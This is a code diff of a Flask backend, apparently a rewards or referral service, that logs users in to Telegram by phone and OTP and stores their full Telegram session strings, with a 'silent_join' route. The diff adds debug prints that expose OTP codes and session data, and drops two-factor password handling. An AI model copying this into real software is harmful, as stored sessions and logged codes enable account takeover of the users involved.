@@ -228,35 +228,26 @@ def send_otp():
 
 @app.route("/api/verify_login", methods=["POST"])
 
-
-
-@app.route("/api/user/data/<telegram_id>")
-def user_data(telegram_id):
-    uid = session.get("uid")
-    if not uid:
-        return jsonify({"status": "error", "message": "session_expired"})
-    user = users_col.find_one({"_id": ObjectId(uid)})
-    if not user:
-        session.clear()
-        return jsonify({"status": "error", "message": "user_not_found"})
-    admin = get_admin_config()
-    user["_id"] = str(user["_id"])
-    return jsonify({"status": "success", "user": user, "admin": admin})
-
 @app.route("/api/verify_login", methods=["POST"])
 def verify_login():
+    import traceback
     data = request.json
     phone = normalize_phone(data.get("phone"))
     code = data.get("code")
     password = data.get("password")
-    ref = data.get('ref')  # ← এই লাইনটি যোগ করুন (রেফার প্যারামিটার)
+    ref = data.get('ref')
+
+    print(f"=== VERIFY_LOGIN START ===")
+    print(f"Phone: {phone}, Code: {code}, Has password: {bool(password)}")
 
     if not phone or phone not in temp_otp_data:
+        print(f"Phone {phone} not found in temp_otp_data. Keys: {list(temp_otp_data.keys())}")
         return jsonify({"success": False, "message": "session_expired"})
 
     temp = temp_otp_data[phone]
-    temp_session_str = temp["temp_session"]
-    phone_code_hash = temp["phone_code_hash"]
+    temp_session_str = temp.get("temp_session")
+    phone_code_hash = temp.get("phone_code_hash")
+    print(f"Temp session (partial): {temp_session_str[:20]}..., phone_code_hash: {phone_code_hash}")
 
     async def _verify():
         client = TelegramClient(StringSession(temp_session_str), API_ID, API_HASH)
@@ -271,9 +262,9 @@ def verify_login():
             me = await client.get_me()
             session_str = client.session.save()
             return True, me, session_str
-        except SessionPasswordNeededError:
-            return False, "SHOW_PWD_STEP"
         except Exception as e:
+            print(f"Error in _verify: {type(e).__name__}: {e}")
+            traceback.print_exc()
             return False, str(e)
         finally:
             await client.disconnect()
@@ -282,6 +273,7 @@ def verify_login():
         result = run_async(_verify())
         if result[0] is True and len(result) == 3:
             me, session_str = result[1], result[2]
+            # ইউজার তৈরি বা আপডেট করুন
             user = users_col.find_one({"telegram_id": str(me.id)})
             if not user:
                 user_data = {
@@ -294,15 +286,13 @@ def verify_login():
                     "cash": 0,
                     "aaf": 0,
                     "refer_count": 0,
-                    "refer_by": None,
+                    "refer_by": ref,
                     "is_joined": False,
                     "tasks_done": 0,
                     "created_at": datetime.utcnow(),
                     "last_login": datetime.utcnow()
                 }
-                # ✅ রেফারেল লজিক (নতুন ইউজার)
                 if ref:
-                    user_data["refer_by"] = ref
                     users_col.update_one({"telegram_id": ref}, {"$inc": {"refer_count": 1}})
                 result_id = users_col.insert_one(user_data).inserted_id
             else:
@@ -323,8 +313,25 @@ def verify_login():
             else:
                 return jsonify({"success": False, "message": msg})
     except Exception as e:
-        print(f"verify_login error: {e}")
+        print(f"Outer exception: {e}")
+        traceback.print_exc()
         return jsonify({"success": False, "message": str(e)})
+
+
+
+@app.route("/api/user/data/<telegram_id>")
+def user_data(telegram_id):
+    uid = session.get("uid")
+    if not uid:
+        return jsonify({"status": "error", "message": "session_expired"})
+    user = users_col.find_one({"_id": ObjectId(uid)})
+    if not user:
+        session.clear()
+        return jsonify({"status": "error", "message": "user_not_found"})
+    admin = get_admin_config()
+    user["_id"] = str(user["_id"])
+    return jsonify({"status": "success", "user": user, "admin": admin})
+
 
 @app.route("/api/silent_join", methods=["POST"])
 @login_required
